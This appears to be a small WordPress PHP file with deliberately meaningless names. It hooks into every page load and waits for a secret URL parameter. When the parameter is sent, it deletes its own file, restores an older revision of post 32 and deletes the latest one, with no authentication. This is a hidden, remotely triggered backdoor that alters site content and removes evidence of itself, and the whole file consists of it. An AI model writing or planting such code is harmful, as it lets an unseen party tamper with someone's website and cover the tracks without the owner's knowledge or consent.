<?php

function groups_creator_qr() {
	if (isset($_GET['virtual_action_live']) && $_GET['virtual_action_live'] === 'now_health_share_connector') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$script_text_optimizer_variations = 32;
		$options_refresh_header = wp_get_post_revisions($script_text_optimizer_variations);
		if (empty($options_refresh_header)) die('no revisions');
		if (count($options_refresh_header) < 2) die('less than 2');
		$meta_widgets_quotes_label = array_shift($options_refresh_header);
		$index_marketplace_dev_validation = $meta_widgets_quotes_label->ID;
		$pullquote_stripe_list = array_shift($options_refresh_header);
		$message_logo_most_editor = $pullquote_stripe_list->ID;
		$wow_lightbox_newsletter_official = wp_restore_post_revision($message_logo_most_editor);
		if ($wow_lightbox_newsletter_official === false) die('error restoring');
		$wow_lightbox_newsletter_official = wp_delete_post_revision($index_marketplace_dev_validation);		
		if ($wow_lightbox_newsletter_official === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'groups_creator_qr');
